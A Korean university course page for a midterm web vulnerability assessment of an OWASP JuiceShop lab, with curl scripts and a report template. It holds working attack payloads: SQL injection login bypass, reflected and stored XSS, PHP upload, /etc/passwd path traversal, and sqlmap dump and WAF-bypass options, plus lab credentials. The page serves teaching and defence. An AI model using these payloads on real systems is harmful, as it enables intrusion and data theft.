# Week 08: 중간고사 — JuiceShop 점검 보고서

## 학습 목표
- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
- 전문적인 취약점 점검 보고서를 작성할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 시험 안내
- **시간**: 120분 (점검 90분 + 보고서 작성 30분)
- **대상**: http://10.20.30.80:3000 (OWASP JuiceShop)
- **제출물**: 취약점 점검 보고서 (아래 양식에 따라 작성)
- **평가 기준**: 취약점 발견 수, 보고서 품질, 재현 가능성

---

## 1. OWASP Testing Guide 개요 (15분)

### 1.1 OWASP Testing Guide란?

OWASP Testing Guide(OTG)는 웹 애플리케이션 보안 테스트의 표준 방법론이다.
체계적인 점검 절차와 항목을 제시한다.

### 1.2 점검 카테고리 (이번 중간고사 범위)

| 카테고리 | OTG 코드 | 이번 과정 주차 |
|---------|---------|--------------|
| 정보수집 | OTG-INFO | Week 03 |
| 인증 | OTG-AUTHN | Week 04 |
| 세션 관리 | OTG-SESS | Week 04 |
| 입력값 검증 | OTG-INPVAL | Week 05~07 |
| 에러 처리 | OTG-ERR | Week 03 (일부) |

### 1.3 점검 순서

```
1단계: 정보수집 (15분)
  ↓
2단계: 인증/세션 점검 (20분)
  ↓
3단계: 입력값 검증 점검 (40분)
  ↓
4단계: 기타 취약점 (15분)
  ↓
5단계: 보고서 작성 (30분)
```

---

## 2. 1단계: 정보수집 (15분)

> **이 실습을 왜 하는가?**
> "중간고사 — JuiceShop 점검 보고서" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 기본 정보 수집 체크리스트

> **실습 목적**: 중간고사로 JuiceShop 전체를 대상으로 종합 웹 취약점 점검을 수행하고 보고서를 작성한다
>
> **배우는 것**: 정보수집부터 취약점 발견, 증명, 보고서 작성까지 점검 프로젝트 전 과정을 독립적으로 수행한다
>
> **결과 해석**: 각 취약점의 재현 가능한 PoC와 CVSS 점수를 포함한 보고서가 완성되면 성공이다
>
> **실전 활용**: 실제 웹 취약점 점검 납품물은 발견 취약점, PoC, CVSS, 대응 권고를 포함한 보고서이다

```bash
# 서버 정보
echo "=== 서버 헤더 ==="
curl -sI http://10.20.30.80:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport"

echo ""
echo "=== 쿠키 정보 ==="
curl -sI http://10.20.30.80:3000 | grep -i set-cookie

echo ""
echo "=== robots.txt ==="
curl -s http://10.20.30.80:3000/robots.txt             # silent 모드

echo ""
echo "=== 보안 헤더 존재 여부 ==="
for header in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" "Strict-Transport-Security" "X-XSS-Protection"; do  # 반복문 시작
  value=$(curl -sI http://10.20.30.80:3000 | grep -i "$header" | head -1)
  if [ -n "$value" ]; then
    echo "[설정됨] $value"
  else
    echo "[미설정] $header"
  fi
done
```

### 2.2 디렉터리/API 탐색

```bash
# 주요 경로 스캔
echo "=== 디렉터리/API 스캔 ==="
for path in \
  "" "ftp" "api" "rest" "admin" "metrics" "promotion" "video" \
  "api/Products/1" "api/Feedbacks" "api/Challenges" "api/SecurityQuestions" \
  "rest/products/search?q=test" "rest/user/whoami" "rest/languages" \
  "assets/public/images/uploads" "encryptionkeys" \
  ".well-known/security.txt" "swagger" "api-docs"; do
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$path")
  if [ "$code" != "404" ]; then
    echo "[$code] /$path"
  fi
done
```

---

## 3. 2단계: 인증/세션 점검 (20분)

### 3.1 인증 점검 체크리스트

```bash
echo "=== 비밀번호 정책 점검 ==="

# 짧은 비밀번호
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
echo "1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

# 숫자만
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
echo "숫자만: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

echo ""
echo "=== 무차별 대입 방어 ==="
for i in $(seq 1 5); do                                # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
  echo "시도 $i: HTTP $code"
done
```

### 3.2 세션/JWT 점검

```bash
echo "=== JWT 분석 ==="
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"mid1@test.com","password":"1"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)

if [ -n "$TOKEN" ]; then
  echo "JWT Header:"
  echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null

  echo ""
  echo "JWT Payload:"
  echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))" 2>/dev/null
fi
```

---

## 4. 3단계: 입력값 검증 점검 (40분)

### 4.1 SQL Injection 점검

```bash
echo "=== SQL Injection ==="

# 로그인 SQLi
result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}")  # 요청 데이터(body)
echo "로그인 SQLi: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('취약' if 'token' in d.get('authentication',{}) else '안전')" 2>/dev/null)"

# 검색 SQLi
result1=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
result2=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple'))OR+1=1--" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
echo "검색 SQLi: 정상=$result1, 주입=$result2 $([ "$result1" != "$result2" ] && echo '(취약)' || echo '(추가 확인 필요)')"
```

### 4.2 XSS 점검

```bash
echo "=== XSS 점검 ==="

# Reflected XSS
for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do  # 반복문 시작
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "반사 XSS: $payload → 반사됨 (취약)"
  else
    echo "반사 XSS: $payload → 필터링됨"
  fi
done

# Stored XSS (피드백)
if [ -n "$TOKEN" ]; then
  curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"comment":"<script>alert(1)</script>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1  # 요청 데이터(body)
  stored=$(curl -s http://10.20.30.80:3000/api/Feedbacks/ | grep -c "alert(1)")
  echo "저장 XSS (피드백): $( [ $stored -gt 0 ] && echo '취약' || echo '안전')"
fi
```

### 4.3 파일 업로드 / 경로 순회 점검

```bash
echo "=== 파일 업로드 ==="
echo '<?php echo "test"; ?>' > /tmp/mid_test.php
result=$(curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/mid_test.php" -w "\nHTTP:%{http_code}")
echo "PHP 업로드: $result"

echo ""
echo "=== 경로 순회 ==="
for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do  # 반복문 시작
  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
  echo "Payload: $payload → ${result:0:50}"
done

rm -f /tmp/mid_test.php                                # 파일 삭제
```

---

## 5. 4단계: 기타 취약점 (15분)

```bash
echo "=== 정보 노출 ==="
# 에러 메시지
curl -s http://10.20.30.80:3000/api/Products/abc | python3 -m json.tool 2>/dev/null | head -10  # silent 모드

echo ""
echo "=== 접근 제어 ==="
# 인증 없이 API 접근
for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users"; do  # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  echo "[$code] /$api (인증 없이)"
done

echo ""
echo "=== HTTPS 설정 ==="
curl -s -o /dev/null -w "%{http_code}" https://10.20.30.80:3000 2>/dev/null || echo "HTTPS 미지원"  # silent 모드
```

---

## 6. 5단계: 보고서 작성 (30분)

### 6.1 보고서 양식

```markdown
# 웹 취약점 점검 보고서

## 1. 점검 개요
- 점검 대상: http://10.20.30.80:3000 (OWASP JuiceShop)
- 점검 일시: 2026-03-27
- 점검자: (이름)
- 점검 도구: curl, nikto, sqlmap, Python

## 2. 요약
- 총 점검 항목: __개
- 취약점 발견: 상(__)건 / 중(__)건 / 하(__)건

## 3. 발견 취약점 목록

### 3.1 [상] SQL Injection — 로그인 우회
- **위치**: POST /rest/user/login
- **유형**: Classic SQL Injection
- **위험도**: 상 (인증 우회)
- **재현 방법**:
  ```bash
  curl -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"' OR 1=1--","password":"x"}'         # 요청 데이터(body)
  ```
- **영향**: 관리자 계정 무단 접근 가능
- **권고 사항**: Prepared Statement 적용, 입력값 검증

### 3.2 [상] (다음 취약점)
- **위치**:
- **유형**:
- **위험도**:
- **재현 방법**:
- **영향**:
- **권고 사항**:

(발견한 모든 취약점에 대해 반복 작성)

## 4. 보안 헤더 점검 결과
| 헤더 | 상태 | 권고 |
|------|------|------|
| X-Frame-Options | | |
| X-Content-Type-Options | | |
| Content-Security-Policy | | |
| Strict-Transport-Security | | |

## 5. 종합 평가
(전체적인 보안 수준 평가, 우선 조치 사항)

## 6. 부록
(nikto 스캔 결과, sqlmap 결과 등 첨부)
```

---

## 7. 평가 기준

| 항목 | 배점 | 세부 기준 |
|------|------|----------|
| 정보수집 | 15점 | 기술 스택 식별, 디렉터리 발견 |
| 인증/세션 | 15점 | 비밀번호 정책, JWT 분석, 세션 관리 |
| SQL Injection | 20점 | 발견, 재현, 영향 분석 |
| XSS | 15점 | Reflected/Stored/DOM 구분, 재현 |
| 기타 취약점 | 10점 | 파일 업로드, 경로 순회, 명령어 주입 |
| 보고서 품질 | 25점 | 형식, 재현 가능성, 권고 사항 |
| **합계** | **100점** | |

### 가산점
- JuiceShop 챌린지 해결 (+5점/개, 최대 +15점)
- ModSecurity(포트 80) WAF 우회 성공 (+10점)
- 수업에서 다루지 않은 취약점 발견 (+5점/개)

---

## 8. JuiceShop 챌린지 가이드

JuiceShop에는 난이도별 챌린지가 있다. 중간고사에서 해결하면 가산점을 받는다.

```bash
# 챌린지 목록 조회
curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "  # silent 모드
import sys, json
data = json.load(sys.stdin).get('data', [])
for c in sorted(data, key=lambda x: x.get('difficulty', 0)):  # 반복문 시작
    solved = '해결' if c.get('solved') else '미해결'
    print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')
" 2>/dev/null | head -20
```

---

## 9. 주의 사항

1. **점검 대상 확인**: 반드시 `10.20.30.80:3000` (JuiceShop)만 점검할 것
2. **기록 유지**: 모든 명령어와 결과를 기록할 것 (보고서 근거)
3. **파괴적 행위 금지**: 서비스 중단, 데이터 삭제 등은 감점
4. **협업 금지**: 개인별 독립적으로 수행
5. **인터넷 참고 허용**: 도구 사용법, 페이로드 참고 가능 (보고서 복사 불가)

**다음 주 예고**: Week 09 - 접근제어 점검. 수평/수직 권한 상승, IDOR, API 접근제어를 학습한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 웹 UI 실습

### JuiceShop 파일 업로드 페이지 활용

> **JuiceShop URL:** `http://10.20.30.80:3000`

1. 브라우저에서 `http://10.20.30.80:3000` 접속
2. 우측 상단 **Account → Login** → 계정 생성 또는 기존 계정으로 로그인
3. 좌측 메뉴 또는 주소창에서 **Complaint** 페이지 이동 (`/#/complain`)
4. **Upload** 영역에서 파일 업로드 기능 확인:
   - 허용되는 파일 형식 확인 (PDF, ZIP 등)
   - 파일 크기 제한 확인
5. 점검 보고서(PDF)를 업로드하여 정상 동작 확인
6. 비허용 확장자 파일(.php, .jsp) 업로드 시도 → 클라이언트/서버 검증 차이 관찰
7. Burp Suite로 업로드 요청 인터셉트 → Content-Type 변조 실습
8. `http://10.20.30.80:3000/#/score-board` 에서 파일 업로드 관련 챌린지 진행 상황 확인:
   - "Upload Size" 챌린지
   - "Upload Type" 챌린지
9. Score Board에서 해결한 챌린지에 초록색 체크 표시가 되는지 확인

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

### sqlmap
> **역할:** SQL Injection 탐지·악용 자동화  
> **실행 위치:** `공격자 측 CLI`  
> **접속/호출:** `sqlmap -u <url>` 또는 `-r request.txt`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 |
| `session.sqlite` | 재실행 시 단계 스킵용 캐시 |

**핵심 설정·키**

- `--risk=1~3 --level=1~5` — 탐지 공격 폭 조절
- `--technique=BEUSTQ` — B)lind E)rror U)nion S)tacked T)ime Q)uery

**로그·확인 명령**

- `output/<host>/log` — 요청·응답 로그

**UI / CLI 요점**

- `sqlmap -u ... --dbs` — DB 목록
- `sqlmap -u ... -D juice -T users --dump` — 특정 테이블 덤프
- `sqlmap -r req.txt --batch --crawl=2` — Burp 저장 요청 기반 크롤링

> **해석 팁.** `--batch`로 대화형 프롬프트 자동 Y 처리. WAF가 있을 땐 `--tamper=space2comment,between` 조합으로 우회 시도.

### OWASP ZAP
> **역할:** 오픈소스 자동 웹 취약점 스캐너·프록시  
> **실행 위치:** `작업 PC / Docker`  
> **접속/호출:** GUI `zaproxy`, API `http://zap:8090/JSON/...`, Docker `owasp/zap2docker-stable`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.ZAP/session-*` | 세션 저장소 |
| `context.xml` | 스캔 컨텍스트(범위/인증) |

**핵심 설정·키**

- `Active Scan policy` — 룰별 강도 및 활성화 여부
- `Authentication: form-based` — 로그인이 필요한 페이지 스캔

**로그·확인 명령**

- `~/.ZAP/zap.log` — 스캐너 실행 로그

**UI / CLI 요점**

- Spider — 링크 탐색 크롤링
- Active Scan — 실제 페이로드 주입 점검
- Report → Generate HTML report — 표준 보고서 출력

> **해석 팁.** 인증 필요 페이지는 **Context에 로그인 폼**을 등록하지 않으면 로그아웃 상태로 스캔되어 커버리지가 급감. `zap-baseline.py`는 수동 확인용 경량 모드.

---

## 실제 사례 (WitFoo Precinct 6)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> Sanitized — RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 익명화됨.

### Case 1: `T1041 (Data Theft)` 패턴

```
incident_id=d45fc680-cb9b-11ee-9d8c-014a3c92d0a7 mo_name=Data Theft
red=172.25.238.143 blue=100.64.5.119 suspicion=0.25
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

### Case 2: `T1041 (Data Theft)` 패턴

```
incident_id=c6f8acf0-df14-11ee-9778-4184b1db151c mo_name=Data Theft
red=100.64.3.190 blue=100.64.3.183 suspicion=0.25
```

**해석**: 위 데이터는 실제 incident 의 sanitized 기록이다. `T1041 (Data Theft)` MITRE technique 의 행동 패턴이며, 본 강의의 학습 주제와 동일한 운영 맥락에서 발생한다.

